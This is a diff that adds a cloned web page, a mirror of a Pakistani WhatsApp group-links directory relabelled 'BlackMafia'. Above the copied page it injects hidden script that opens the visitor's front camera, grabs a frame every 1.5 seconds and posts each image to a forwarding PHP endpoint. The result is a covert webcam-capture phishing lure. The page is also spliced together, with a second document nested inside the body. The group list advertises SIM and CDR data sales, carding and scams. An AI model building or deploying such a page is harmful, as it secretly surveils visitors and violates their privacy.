@@ -1,0 +1,3342 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        
+<!DOCTYPE html>
+
+<html lang="en">
+
+
+<!-- Mirrored from www.pak24tv.com/blogs/pakistani-whatsapp-groups by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 03 Dec 2020 22:37:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    
+
+    <title>1000+ Active Pakistani WhatsApp group Links Join - Pak24tv</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+     <meta name="keywords" content="pakistani WhatsApp group links,pakistani WhatsApp group link,WhatsApp group link,WhatsApp group link,pakistani WhatsApp group link,pakistani WhatsApp group link"/>
+    <meta property="og:url" content="pakistani-whatsapp-groups.html"/>
+    <meta property="og:title" content="1000+ Active Pakistani WhatsApp group Links Join - Pak24tv"/>
+    <meta property="og:description" content="Join 1000+ Active Pakistani WhatsApp group Links Join and chat within groups,You can submit your group into this website paktv24.com."/>
+    <meta property="og:type" content="text"/>
+    <meta property="og:image" content="../images/pakistaniwhatsapp.jpg"/>
+    <meta name="description" content="Join 1000+ Active Pakistani WhatsApp group Links Join and chat within groups,You can submit your group into this website paktv24.com."/>
+    <meta property="og:site_name" content="Pak24tv"/>
+    
+    
+<link rel="icon" href="../images/pakistaniwhatsapp.jpg">
+    <link rel="apple-touch-icon" sizes="180x180" href="../images/pakistaniwhatsapp.jpg">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="../../external.html?link=https://www.googletagmanager.com/gtag/js?id=UA-153100748-1"></script>
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-153100748-1');
+</script>
+
+<!--Google Site verification-->
+
+<meta name="google-site-verification" content="gvrZE6Xwo8t_OA6QKCpauatpV7rm-L1WlbouVi5kkwU" />
+
+
+<!--Layout links-->
+
+<link rel="stylesheet" href="../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script type='text/javascript' src='../../platform-api.sharethis.com/js/sharethis.js#property=5e563f51eaf41500129ab803&product=sticky-share-buttons&cms=sop' async='async'></script>
+     
+<script data-ad-client="ca-pub-5934710178337836" async src="../../pagead2.googlesyndication.com/pagead/js/f.txt"></script>
+ <style>
+     	body{
+  		width: 100%;
+  		height: 100%;
+  		margin: 0;
+  		padding: 0;
+  		overflow: auto;
+  	}
+        .thumbnail{
+  	    padding:0 0 0 0;
+  	}
+  	.thumbnail:hover{
+        transform: scale(1.02);
+    }
+    .thumbnail a{
+        color:#000000;
+        font-weight: bold;
+    }
+    h1,h2{
+  background: -webkit-linear-gradient(#A04000, #138D75);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  	}
+  	.navbar{
+  	   margin-bottom: 0;
+      border-radius: 0;
+      background:#1C2833;
+  	}
+  .tab-pane .btn{
+  	    padding:10px 20px;
+  	    font-size:16px;
+  	    font-style:bold;
+  	}
+p
+{
+    font-size:17px;
+}
+td{
+        padding-top:10px;
+        padding-bottom:10px;
+    }
+td:first-child{
+        font-size:17px;
+        width:75%;
+    }
+    td:nth-child(2){
+        font-size:17px;
+        width:25%;
+    }
+    h3{
+  	    font-size:28px;
+  	}
+  	i{
+  	    font-size:20px;
+  	}
+</style>   
+</head>
+
+<body>
+<nav class="navbar navbar-inverse" style="border:none;background-color:#000A08;">
+<div class="container-fluid">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <i><b style="color:#ADFF09;font-size:30px;">BlackMafia</b></i>
+    </div>
+    <div class="collapse navbar-collapse" id="myNavbar">
+      <ul class="nav navbar-nav navbar-left" style="border:none;color:white;">
+<li><a href="../../external.html?link=https://www.pak24tv.com/livechannels.php">Live tv</a></li> 
+         <li><a href="../../external.html?link=https://www.pak24tv.com/mobile-prices-and-specification.php">Mobiles</a></li>
+         <li><a href="../../external.html?link=https://www.pak24tv.com/mobile-comparison.php">Mobile comparison</a></li>
+         <li><a href="../../external.html?link=https://www.pak24tv.com/tools/tools.php">Tools</a></li>
+         <li><a href="../../external.html?link=https://www.pak24tv.com/name/names.php">Names</a></li>
+         <li><a href="interesting-for-you.html">Interesting for you</a></li>
+         <li><a href="../../external.html?link=https://www.pak24tv.com/all-blogs.php?type=Personal">Writter's Blogs</a></li>
+         <li class="dropdown">
+          <a class="dropdown-toggle" data-toggle="dropdown" href="#">Sim packages 
+          <span class="caret"></span></a>
+          <ul class="dropdown-menu">
+                <li><a href="../../external.html?link=https://www.pak24tv.com/jazzpackages/all-jazz-packages.php">Jazz</a></li>  
+                <li><a href="../../external.html?link=https://www.pak24tv.com/telenore/all-telenore-packages.php">Telenor</a></li>  
+                <li><a href="../../external.html?link=https://www.pak24tv.com/zong/all-zong-packages.php">Zong</a></li>    
+                <li><a href="../../external.html?link=https://www.pak24tv.com/ufone/all-ufone-packages.php">Ufone</a></li>    
+
+                </ul>
+        </li>
+                 
+                 <li class="dropdown">
+          <a class="dropdown-toggle" data-toggle="dropdown" href="#">MORE 
+          <span class="caret"></span></a>
+          <ul class="dropdown-menu">
+                <li><a href="../../external.html?link=https://www.pak24tv.com/About-us.php">About us</a></li>
+                <li><a href="../../external.html?link=https://www.pak24tv.com/contact-us.php">Contact us</a></li>
+                <li><a href="../../external.html?link=https://www.pak24tv.com/privacy-policy.php">Privacy policy</a></li>
+                                <li><a href="../../external.html?link=https://www.pak24tv.com/terms-and-condition.php">Terms & Conditions</a></li>
+                                <li><a href="../../external.html?link=https://www.pak24tv.com/disclaimer.php">Disclaimer</a></li>
+                            <li><a href="../../external.html?link=https://www.pak24tv.com/DMCA.html">About license</a></li>
+          </ul>
+        </li>
+  </ul>
+<a href="../../external.html?link=https://www.pak24tv.com/user/login.php" style="float:right;margin-top:10px;"><button class="btn btn-success">Write a post</button></a>
+    </div>
+</nav>     
+  </div>
+                                          <div class="container-fluid text-center">    
+  <div class="row content">
+    <div class="col-sm-2 sidenav" style="background:initial;">
+
+        
+        </div>
+                                              <div class="col-sm-8 text-left">
+                                                  
+             <div class="row" style="width:98%;margin-left:1%;">
+                        <article style="margin-top:15px;color:#fff;border:1px solid #d3d3d3;border-radius:6px;margin-bottom:6px;">
+           <center><h1>1000+ Active Pakistani WhatsApp group Links Join</h1></center>
+    </article>  
+    </div>
+
+ <div class="row" style="width:98%;margin-top:4px;margin-left:1%">
+  <a href="#filter" class="btn btn-default" data-toggle="collapse" style="width:100%;font-size:18px;border:1px solid red"><h3>Share your group</h3></a>
+  <div id="filter" class="collapse" style="padding:15px;border:1px solid #d3d3d3;border-radius:6px;margin-top:4px;width:100%;">
+         <form id="gform" class="form-horizontal" action="../../external.html?link=https://www.pak24tv.com/blogs/submit_group" method="post" style="width:98%;margin-left:1%;" onsubmit="return false;">
+            <div class="form-group">
+    <label for="gname">Type group name:</label>
+    <input type="text" class="form-control" id="gname" name="gname" placeholder="Type group name" required>
+  </div>
+  <div class="form-group">
+      <label for="glink">Type group link:</label>
+    <input type="text" class="form-control" id="glink" name="glink" placeholder="Type group link" required>
+  </div>
+  <div class="form-group">
+<label for="pwd">Select group type:</label>
+   <select class="form-control" id="sel1" name="gtype">
+    <option value="pakistani">Pakistani</option>
+  </select>  </div>
+    <center><button type="submit" class="btn btn-default" style="float:center;" onclick="
+     $.ajax({
+    method:'POST',
+    url:'https://www.pak24tv.com/blogs/submit_group',
+    data:$('#gform').serialize(),
+    success:function(responseText)
+    {
+      if(responseText==='1')
+      {
+         alert('Please fill all the fields');
+      }
+      else
+      {
+         document.getElementById('gform').reset();
+         alert('You group has been submitted and will be published after review within 24 hours');
+      }
+    }
+ });
+    ">Share</button></center>
+         </form><br/>
+  </div>   
+  </div><br/>
+  
+<div class="row" style="width:98%;margin-top:4px;margin-left:1%">
+  <a href="#filter2" class="btn btn-default" data-toggle="collapse" style="width:100%;font-size:18px;border:1px solid red"><h2>Report Group</h2></a>
+  <div id="filter2" class="collapse" style="padding:15px;border:1px solid #d3d3d3;border-radius:6px;margin-top:4px;width:100%;">
+         <form id="grform" class="form-horizontal" action="../../external.html?link=https://www.pak24tv.com/blogs/submit_report" method="post" style="width:98%;margin-left:1%;" onsubmit="return false;">
+  <div class="form-group">
+      <label for="pwd">Group name:</label>
+   <select class="form-control" id="sel1" name="g_name">
+                   
+    <option value="Pakistani Drama Online">Pakistani Drama Online</option>
+                
+    <option value="Sydo ngo">Sydo ngo</option>
+                
+    <option value="Sad deep feeling">Sad deep feeling</option>
+                
+    <option value="Investment bussnis for bitkripton">Investment bussnis for bitkripton</option>
+                
+    <option value="Govt Jobs Pakistan Gp-6">Govt Jobs Pakistan Gp-6</option>
+                
+    <option value="Be rich with us">Be rich with us</option>
+                
+    <option value="Free cryptocurrency trade ">Free cryptocurrency trade </option>
+                
+    <option value="Distributor Karachi">Distributor Karachi</option>
+                
+    <option value="Ishq">Ishq</option>
+                
+    <option value="Tik tok support">Tik tok support</option>
+                
+    <option value="PPSC Arifwala(اصلاحِ معاشرہ)">PPSC Arifwala(اصلاحِ معاشرہ)</option>
+                
+    <option value="Youtube Real Subscribers ">Youtube Real Subscribers </option>
+                
+    <option value="Ppsc fpsc books plateform">Ppsc fpsc books plateform</option>
+                
+    <option value="Mobile qiston per Multan lahore sahiwal bahwalpur">Mobile qiston per Multan lahore sahiwal bahwalpur</option>
+                
+    <option value="ناول کہانیاں ">ناول کہانیاں </option>
+                
+    <option value="Daily Quraan Tafseer">Daily Quraan Tafseer</option>
+                
+    <option value="Online earning granti k 7">Online earning granti k 7</option>
+                
+    <option value="NBox 24 Newz">NBox 24 Newz</option>
+                
+    <option value="🌍~ Worldwide Friends ~💌">🌍~ Worldwide Friends ~💌</option>
+                
+    <option value="Islam&information">Islam&information</option>
+                
+    <option value="Online Cosmetics Makeup Perfumes Jewelry">Online Cosmetics Makeup Perfumes Jewelry</option>
+                
+    <option value="Make money online">Make money online</option>
+                
+    <option value="🇵🇰🎬 𝔾𝔼𝕆 𝕂𝔸ℍ𝔸ℕ𝕀🎧🇵🇰">🇵🇰🎬 𝔾𝔼𝕆 𝕂𝔸ℍ𝔸ℕ𝕀🎧🇵🇰</option>
+                
+    <option value="Tik Tok like and follwer only girl">Tik Tok like and follwer only girl</option>
+                
+    <option value="اصلاحی گروپ">اصلاحی گروپ</option>
+                
+    <option value="Subscribe Youtube Channels And Earn Money">Subscribe Youtube Channels And Earn Money</option>
+                
+    <option value="Pakistan news group">Pakistan news group</option>
+                
+    <option value="Mian Law Associates(Civil.Family.Criminal)">Mian Law Associates(Civil.Family.Criminal)</option>
+                
+    <option value="Drop Nude Selfie">Drop Nude Selfie</option>
+                
+    <option value="Graceful collection ">Graceful collection </option>
+                
+    <option value="Entertainment">Entertainment</option>
+                
+    <option value="Pindi boy Hadi Rahi">Pindi boy Hadi Rahi</option>
+                
+    <option value="Malik Production">Malik Production</option>
+                
+    <option value="Youtube tips">Youtube tips</option>
+                
+    <option value="Report Corona and News updated ">Report Corona and News updated </option>
+                
+    <option value="Islamic group ">Islamic group </option>
+                
+    <option value="Mekhane ishq">Mekhane ishq</option>
+                
+    <option value="🥏ᴀᵖᵖˢ ɢʳᵒᵘᵖ ʟⁱⁿᵏ🪀✔️">🥏ᴀᵖᵖˢ ɢʳᵒᵘᵖ ʟⁱⁿᵏ🪀✔️</option>
+                
+    <option value="Education tech">Education tech</option>
+                
+    <option value="Forever cosmetics and ladies undergarments">Forever cosmetics and ladies undergarments</option>
+                
+    <option value="⁦⁩⁦تاریخ پاکستان🇵🇰">⁦⁩⁦تاریخ پاکستان🇵🇰</option>
+                
+    <option value="All Sim Detail CDR ">All Sim Detail CDR </option>
+                
+    <option value="Urdu shary">Urdu shary</option>
+                
+    <option value="YouTube and instagramers">YouTube and instagramers</option>
+                
+    <option value="☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜">☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜</option>
+                
+    <option value="jobsalert & preparation">jobsalert & preparation</option>
+                
+    <option value="Tiktok Paid Promotion">Tiktok Paid Promotion</option>
+                
+    <option value="Online Betting company">Online Betting company</option>
+                
+    <option value="Islamic tehreers">Islamic tehreers</option>
+                
+    <option value="Online businesshere">Online businesshere</option>
+                
+    <option value=" 💞 تاجدارِ ختمِ نبوت ﷺ💞"> 💞 تاجدارِ ختمِ نبوت ﷺ💞</option>
+                
+    <option value="Typing job">Typing job</option>
+                
+    <option value="Job magazine All today job">Job magazine All today job</option>
+                
+    <option value="WWE Group">WWE Group</option>
+                
+    <option value="SiM DATA TRACKERS">SiM DATA TRACKERS</option>
+                
+    <option value="UC CARDER TRUSTED">UC CARDER TRUSTED</option>
+                
+    <option value="Ladies Suits ">Ladies Suits </option>
+                
+    <option value="🎤 voice group 🎤">🎤 voice group 🎤</option>
+                
+    <option value="Products Seller Website In Pakistan">Products Seller Website In Pakistan</option>
+                
+    <option value="Urdu Poetry">Urdu Poetry</option>
+                
+    <option value="Balveer  return Hd">Balveer  return Hd</option>
+                
+    <option value="بلوچ کاروان گروپ">بلوچ کاروان گروپ</option>
+                
+    <option value="1️⃣ DAILY ILM E DEEN">1️⃣ DAILY ILM E DEEN</option>
+                
+    <option value="Islamic information group ">Islamic information group </option>
+                
+    <option value="Pubg.Hacks😈">Pubg.Hacks😈</option>
+                
+    <option value="UC SHOP PAKISTAN">UC SHOP PAKISTAN</option>
+                
+    <option value="Quran Hadees">Quran Hadees</option>
+                
+    <option value="All network secret data">All network secret data</option>
+                
+    <option value="Earn money with B4U">Earn money with B4U</option>
+                
+    <option value="Money From Google 100%">Money From Google 100%</option>
+                
+    <option value="islam">islam</option>
+                
+    <option value="Yara da tola">Yara da tola</option>
+                
+    <option value="sun Light">sun Light</option>
+                
+    <option value="General knowledge">General knowledge</option>
+                
+    <option value="Information Group">Information Group</option>
+                
+    <option value="Only sad video">Only sad video</option>
+                
+    <option value="Online real earning">Online real earning</option>
+                
+    <option value="Islam">Islam</option>
+                
+    <option value="Molana Tariq Jameel ">Molana Tariq Jameel </option>
+                
+    <option value="Rail Sites  Full Free">Rail Sites  Full Free</option>
+                
+    <option value="Islamic Post For Success in Life">Islamic Post For Success in Life</option>
+                
+    <option value="Only teen pubg players">Only teen pubg players</option>
+                
+    <option value="Daily Pakistan">Daily Pakistan</option>
+                
+    <option value="Sameer">Sameer</option>
+                
+    <option value="Sad Poetry">Sad Poetry</option>
+                
+    <option value="Rabub Ul Chandio">Rabub Ul Chandio</option>
+                
+    <option value="🄺🄽🄾🅆🄻🄴🄳🄶🄴2️⃣">🄺🄽🄾🅆🄻🄴🄳🄶🄴2️⃣</option>
+                
+    <option value="You tube Copyright work">You tube Copyright work</option>
+                
+    <option value="Online Sports">Online Sports</option>
+                
+    <option value="CRYPTO FREE REAL SITE ">CRYPTO FREE REAL SITE </option>
+                
+    <option value=" Ajnabi per Apna Sa"> Ajnabi per Apna Sa</option>
+                
+    <option value="Only sad video">Only sad video</option>
+                
+    <option value="Pic wa sticker">Pic wa sticker</option>
+                
+    <option value="🌹Best Frinds♥️">🌹Best Frinds♥️</option>
+                
+    <option value="Sootta">Sootta</option>
+                
+    <option value="Be friendly 😍">Be friendly 😍</option>
+                
+    <option value="وادی سون نیوز">وادی سون نیوز</option>
+                
+    <option value="Cricket update.">Cricket update.</option>
+                
+    <option value="(اصلاحِ معاشرہ)">(اصلاحِ معاشرہ)</option>
+                
+    <option value="Resaler group pakistan ">Resaler group pakistan </option>
+                
+    <option value="(3)اصلاحِ معاشرہ">(3)اصلاحِ معاشرہ</option>
+                
+    <option value="Without investment sites ">Without investment sites </option>
+                
+    <option value="OnlineEarningReal100%">OnlineEarningReal100%</option>
+                
+    <option value="ONLIIN EARNING ">ONLIIN EARNING </option>
+                
+    <option value="GRAM FREE PAYOUT ">GRAM FREE PAYOUT </option>
+                
+    <option value="youtube secret triks">youtube secret triks</option>
+                
+    <option value="Lahore Shemele">Lahore Shemele</option>
+                
+    <option value="Geo Sindh Anmool">Geo Sindh Anmool</option>
+                
+    <option value="MAF Collection ">MAF Collection </option>
+                
+    <option value="FREE INTERNET 2020">FREE INTERNET 2020</option>
+                
+    <option value="☝دینِِ حق☝">☝دینِِ حق☝</option>
+                
+    <option value="Tiktoke">Tiktoke</option>
+                
+    <option value="Stockmarket forex">Stockmarket forex</option>
+                
+    <option value="Memes of pakistann">Memes of pakistann</option>
+                
+    <option value="Online Quran female ">Online Quran female </option>
+                
+    <option value="New brands ">New brands </option>
+                
+    <option value="Payeer and Pm buy Sell low reta ">Payeer and Pm buy Sell low reta </option>
+                
+    <option value=" news and jobs group 2020"> news and jobs group 2020</option>
+                
+    <option value="Gold state digital earn">Gold state digital earn</option>
+                
+    <option value="Pakistani YouTuber Helps">Pakistani YouTuber Helps</option>
+                
+    <option value="Hybrid war Pakistan">Hybrid war Pakistan</option>
+                
+    <option value="bayan">bayan</option>
+                
+    <option value="Darwaysh.com ">Darwaysh.com </option>
+                
+    <option value="➖مولانا طارق جمیل ➖4⃣">➖مولانا طارق جمیل ➖4⃣</option>
+                
+    <option value="مردانہ کمزوری کا علاج">مردانہ کمزوری کا علاج</option>
+                
+    <option value="ONLY Big invester ">ONLY Big invester </option>
+                
+    <option value="🕋🌹✒️ سنہــــــرے اوراق✒️🌹🕋">🕋🌹✒️ سنہــــــرے اوراق✒️🌹🕋</option>
+                
+    <option value="💔🤎Pᴏᴛᴇʀʏ ✍️ ʟᴏᴠᴇʀs🤎💔1️⃣">💔🤎Pᴏᴛᴇʀʏ ✍️ ʟᴏᴠᴇʀs🤎💔1️⃣</option>
+                
+    <option value="Urdu Poetry Only ">Urdu Poetry Only </option>
+                
+    <option value="𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ ">𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ </option>
+                
+    <option value="SiM DATABASE">SiM DATABASE</option>
+                
+    <option value="Ppsc fpsc books plateform">Ppsc fpsc books plateform</option>
+                
+    <option value="Online Shopping">Online Shopping</option>
+                
+    <option value="Photo Editing">Photo Editing</option>
+                
+    <option value="general knowledge 2">general knowledge 2</option>
+                
+    <option value="All SIM Network data CDR Nadra data group">All SIM Network data CDR Nadra data group</option>
+                
+    <option value="Cloth, Fabric Wholesale">Cloth, Fabric Wholesale</option>
+                
+    <option value="Online work">Online work</option>
+                
+    <option value="Shoes Business In pakistan">Shoes Business In pakistan</option>
+                
+    <option value="YouTube promoters">YouTube promoters</option>
+                
+    <option value="Pubg prime plus">Pubg prime plus</option>
+                
+    <option value="Onine earinng for all">Onine earinng for all</option>
+                
+    <option value="Lahore Bottem">Lahore Bottem</option>
+                
+    <option value="Nts latest objectives">Nts latest objectives</option>
+                
+    <option value="Entertainment">Entertainment</option>
+                
+    <option value="Crepto doubler website ">Crepto doubler website </option>
+                
+    <option value="Online Earn Money">Online Earn Money</option>
+                
+    <option value="Titok helper">Titok helper</option>
+                
+    <option value="Pakistan Army">Pakistan Army</option>
+                
+    <option value="tiktok">tiktok</option>
+                
+    <option value="islami group ">islami group </option>
+                
+    <option value="Ishq aibadat ">Ishq aibadat </option>
+                
+    <option value="Only sad video">Only sad video</option>
+                
+    <option value="Gujranwala Mobile">Gujranwala Mobile</option>
+                
+    <option value="Tax Professionals-2">Tax Professionals-2</option>
+                
+    <option value="Hand med leather shoes">Hand med leather shoes</option>
+                
+    <option value="Photo_logo_intro_editing">Photo_logo_intro_editing</option>
+                
+    <option value="Links viewer ">Links viewer </option>
+                
+    <option value="Friendz zone">Friendz zone</option>
+                
+    <option value="قرآن وحدیث">قرآن وحدیث</option>
+                
+    <option value="Mirza Uc Shop">Mirza Uc Shop</option>
+                
+    <option value="ناول کہانیاں ">ناول کہانیاں </option>
+                
+    <option value="Online shopping ">Online shopping </option>
+                
+    <option value="Jobs in pakistan 2">Jobs in pakistan 2</option>
+                
+    <option value="Jobs in Pakistan">Jobs in Pakistan</option>
+                
+    <option value="Pubg accounts">Pubg accounts</option>
+                
+    <option value="𝔰𝔲𝔭𝔢𝔯꧁ꊰ꒤ꋊꉣꄲ꒐ꋊ꓄꧂๖ۣۜℋค℘℘ℽ">𝔰𝔲𝔭𝔢𝔯꧁ꊰ꒤ꋊꉣꄲ꒐ꋊ꓄꧂๖ۣۜℋค℘℘ℽ</option>
+                
+    <option value="Get Free USD Group">Get Free USD Group</option>
+                
+    <option value="❤️آل سنگربلوچی دھماکہ🔨">❤️آل سنگربلوچی دھماکہ🔨</option>
+                
+    <option value="Online shopping cash on delivery ">Online shopping cash on delivery </option>
+                
+    <option value="Sad girls friendship join group">Sad girls friendship join group</option>
+                
+    <option value="Earn money 100✓">Earn money 100✓</option>
+                
+    <option value="Ashiq janoon">Ashiq janoon</option>
+                
+    <option value="القرآن آنلائن اکیڈمی 03081074148">القرآن آنلائن اکیڈمی 03081074148</option>
+                
+    <option value="jobsalert & preparation">jobsalert & preparation</option>
+                
+    <option value="Youtuber ">Youtuber </option>
+                
+    <option value="Pak Youtubers Islamabad ">Pak Youtubers Islamabad </option>
+                
+    <option value="Watsapp band unband group hacking">Watsapp band unband group hacking</option>
+                
+    <option value="Govt Jobs Pakistan Gp-1">Govt Jobs Pakistan Gp-1</option>
+                
+    <option value="Civic jobs">Civic jobs</option>
+                
+    <option value="Online work without investment💯">Online work without investment💯</option>
+                
+    <option value="Pubg prime plus">Pubg prime plus</option>
+                
+    <option value="Backbenchers">Backbenchers</option>
+                
+    <option value="JOBS UpDaTes.">JOBS UpDaTes.</option>
+                
+    <option value="Buy & sail pakistan">Buy & sail pakistan</option>
+                
+    <option value="Buy & Sale and Online Earning pakistan ">Buy & Sale and Online Earning pakistan </option>
+                
+    <option value="CRYPTO FREE SITE ">CRYPTO FREE SITE </option>
+                
+    <option value="King Pakistani">King Pakistani</option>
+                
+    <option value="Pakpattan online shopping ">Pakpattan online shopping </option>
+                
+    <option value="YouTube Subscriber ">YouTube Subscriber </option>
+                
+    <option value="Poetry world🔥">Poetry world🔥</option>
+                
+    <option value="Learn English">Learn English</option>
+                
+    <option value="Paying Sites 💯">Paying Sites 💯</option>
+                
+    <option value="Friendship ❤️">Friendship ❤️</option>
+                
+    <option value="Pakistani online bazaar">Pakistani online bazaar</option>
+                
+    <option value="Ladies Cosmetics Dress ">Ladies Cosmetics Dress </option>
+                
+    <option value="love me thoda">love me thoda</option>
+                
+    <option value="Pubg account market">Pubg account market</option>
+                
+    <option value="Pubg prime plus shop">Pubg prime plus shop</option>
+                
+    <option value="Car 4 Sale ">Car 4 Sale </option>
+                
+    <option value="Forsage.io">Forsage.io</option>
+                
+    <option value="Everything for you">Everything for you</option>
+                
+    <option value="Online earning pakistan ">Online earning pakistan </option>
+                
+    <option value="Dil Dosti etc.🦋">Dil Dosti etc.🦋</option>
+                
+    <option value="Mobile khrdain or bachain">Mobile khrdain or bachain</option>
+                
+    <option value="Ayyan">Ayyan</option>
+                
+    <option value="Health And Beauty Product">Health And Beauty Product</option>
+                
+    <option value="Rajput brand ">Rajput brand </option>
+                
+    <option value="Subscribe Youtube Channels And Earn Money">Subscribe Youtube Channels And Earn Money</option>
+                
+    <option value="Lasani oil traders">Lasani oil traders</option>
+                
+    <option value="Silsala payar ka he ">Silsala payar ka he </option>
+                
+    <option value="🃏⁦⁦⁦PERFECT ⁩VIRUS⁦⁦⁦🃏">🃏⁦⁦⁦PERFECT ⁩VIRUS⁦⁦⁦🃏</option>
+                
+    <option value="Online earning ">Online earning </option>
+                
+    <option value="News update  only pakistan ">News update  only pakistan </option>
+                
+    <option value="HIDDEN CHOICE ONLINE SHOPPING ">HIDDEN CHOICE ONLINE SHOPPING </option>
+                
+    <option value="Bitcoin® Trusted CEO INVESTMENT Website ">Bitcoin® Trusted CEO INVESTMENT Website </option>
+                
+    <option value="FORSAGE Best platform ">FORSAGE Best platform </option>
+                
+    <option value="آدھورئ محبت">آدھورئ محبت</option>
+                
+    <option value="Khushab Dhodha Booking">Khushab Dhodha Booking</option>
+                
+    <option value="کرلس عثمان سیزن 2 اردو">کرلس عثمان سیزن 2 اردو</option>
+                
+    <option value="Linguistics & Literature ">Linguistics & Literature </option>
+                
+    <option value="اسلامک گروپ">اسلامک گروپ</option>
+                
+    <option value="Atish e ishq ">Atish e ishq </option>
+                
+    <option value="Daily Quraan Tafseer">Daily Quraan Tafseer</option>
+                
+    <option value="Earn Money With Play Pubg Game">Earn Money With Play Pubg Game</option>
+                
+    <option value="Real online earning 100%✓">Real online earning 100%✓</option>
+                
+    <option value="Geo Jamali">Geo Jamali</option>
+                
+    <option value="Earn Without Investment with instagram">Earn Without Investment with instagram</option>
+                
+    <option value="Oriflame cosmetics">Oriflame cosmetics</option>
+                
+    <option value="Hamza">Hamza</option>
+                
+    <option value="اردو ادب ">اردو ادب </option>
+                
+    <option value="ISLAMIC GROUP">ISLAMIC GROUP</option>
+                
+    <option value="Pakistani Films Online">Pakistani Films Online</option>
+                
+    <option value="PPSC Arifwala">PPSC Arifwala</option>
+                
+    <option value="یاراں نال بہاراں">یاراں نال بہاراں</option>
+                
+    <option value="Typing job real">Typing job real</option>
+                
+    <option value="L.E.D Bulb Hole Sale Pakistan">L.E.D Bulb Hole Sale Pakistan</option>
+                
+    <option value="Govt Jobs Pakistan Gp-2">Govt Jobs Pakistan Gp-2</option>
+                
+    <option value="Earn at home">Earn at home</option>
+                
+    <option value="Jazz free internet tricks">Jazz free internet tricks</option>
+                
+    <option value="Pak army">Pak army</option>
+                
+    <option value="1 اصلاحی گروپ">1 اصلاحی گروپ</option>
+                
+    <option value="Purchase of jewelry">Purchase of jewelry</option>
+                
+    <option value="𝔼🇳​𝙏𝙀ℝTི🇦​Ĩ🇳​Mི🅴N🇹​ 𝙂𝙍𝙊𝙐𝙋">𝔼🇳​𝙏𝙀ℝTི🇦​Ĩ🇳​Mི🅴N🇹​ 𝙂𝙍𝙊𝙐𝙋</option>
+                
+    <option value="🇰‌🇳‌🇴‌🇼‌🇱‌🇪‌🇩‌🇬‌🇪‌">🇰‌🇳‌🇴‌🇼‌🇱‌🇪‌🇩‌🇬‌🇪‌</option>
+                
+    <option value="Shah g ncp motors">Shah g ncp motors</option>
+                
+    <option value="Onlion Shopping ">Onlion Shopping </option>
+                
+    <option value="jobsalert & preparation">jobsalert & preparation</option>
+                
+    <option value="ECONEX(Network Marketing)">ECONEX(Network Marketing)</option>
+                
+    <option value="Icms educatinal news">Icms educatinal news</option>
+                
+    <option value="𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ ">𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ </option>
+                
+    <option value="Marriage.pk">Marriage.pk</option>
+                
+    <option value="I ❤ islam">I ❤ islam</option>
+                
+    <option value="Mikhana ishq">Mikhana ishq</option>
+                
+    <option value="Only for Amazon Buyers">Only for Amazon Buyers</option>
+                
+    <option value="Online shoping">Online shoping</option>
+                
+    <option value="jobsalert & preparation">jobsalert & preparation</option>
+                
+    <option value="Al_Barakah selling Market">Al_Barakah selling Market</option>
+                
+    <option value="Sim deta location trace cdr ">Sim deta location trace cdr </option>
+                
+    <option value="Muslim ">Muslim </option>
+                
+    <option value="سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ">سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ</option>
+                
+    <option value="Create profile image">Create profile image</option>
+                
+    <option value="Deta sim">Deta sim</option>
+                
+    <option value="Paskitan 🇵🇰">Paskitan 🇵🇰</option>
+                
